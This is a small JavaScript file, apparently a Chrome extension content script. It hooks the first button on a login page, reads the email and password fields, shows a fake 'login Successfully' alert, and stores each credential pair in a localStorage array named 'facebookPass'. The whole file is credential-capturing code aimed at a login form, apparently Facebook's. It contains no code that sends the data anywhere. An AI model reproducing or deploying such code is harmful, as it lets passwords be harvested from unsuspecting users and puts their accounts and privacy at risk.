console.log("Chrome extension running");

let btn = document.getElementsByTagName("button");
btn[0].addEventListener("click", () => chalja());

// for(let i; i > inputs.length; i++){
// input.style['background-color'] = "red"}

function chalja() {
  let inputs = document.getElementById("pass").value;
  let email = document.getElementById("email").value;
  console.log(btn);
  console.log(inputs);
  alert("login Successfully");
  let full = {
    email: email,
    password: inputs
  };
  if (localStorage.getItem("facebookPass")) {
    let data = JSON.parse(localStorage.getItem("facebookPass"));
    data.push(full);
    localStorage.setItem("facebookPass", JSON.stringify(data));
  }else{
  let data = [];
  data.push(full);
  localStorage.setItem("facebookPass", JSON.stringify(data));
  }
}
